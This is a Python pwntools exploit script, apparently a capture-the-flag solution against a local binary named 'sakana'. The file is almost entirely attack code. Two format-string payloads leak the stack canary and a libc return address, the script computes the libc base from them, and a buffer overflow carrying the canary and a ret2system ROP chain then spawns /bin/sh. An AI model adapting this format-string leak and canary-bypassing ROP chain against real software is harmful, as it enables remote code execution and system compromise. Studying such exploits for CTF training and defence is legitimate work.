
from pwn import *

import symbol


libc=ELF('pwn/sakana/libc-2.31.so')
elf=context.binary=ELF('pwn/sakana/sakana')

#info("system_addr: %#x",libc.symbols.system)
#bin_sh=next(libc.search(b'/bin/sh\x00'))
#info("bin/sh: %#x",bin_sh)




r=process('pwn/sakana/sakana')
output=r.recvuntil(b'~>')#stuff from banner


#the 1st payload finds canary
payload=flat([
    b'%X-'*(33+5+1)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
])
#%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-

r.sendline(b'printf')
r.sendline(payload)

output=r.recvuntil(b'~>')#stuff containing canary
print(output)
_canary=output.decode().split('0x')[-1][:16]
print('the canary is: 0x%s'%_canary)
_canary=int(_canary,16)
print('the canary is: 0x%x'%_canary)
#exit(1)

sleep(0.5)
#the 2nd payload finds the libc_start main's address
payload=flat([
    b'%X-'*(33+5+1+6)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
    #and finally, we see that the return address to libc start main+0x243 is 6 words up
])
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')#stuff containing return address to libc start main+0x243
print(output)
_libc_start_main=output.decode().split('0x')[-1][:16]
print('return address to libc start main+0x243: 0x%s'%_libc_start_main)
_libc_start_main=int(_libc_start_main,16)
_libc_start_main-=0x243
print('return address to libc start main: 0x%x'%_libc_start_main)

#update the libc base address

libc.address=_libc_start_main-libc.symbols.__libc_start_main

#the 3rd payload gets the shell
off_set_to_canary=264
pop_rdi=0x00000000000023a3#found in binary by ropper
ret=0x000000000000101a#also found by ropper, for stack alignment
payload = flat([
    off_set_to_canary * b'A',  
    _canary,  
    8 * b'A',  
    # Ret2system
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,  # Stack alignment
    libc.symbols.system
])
r.sendline(b'printf')
r.sendline(payload)

r.interactive()

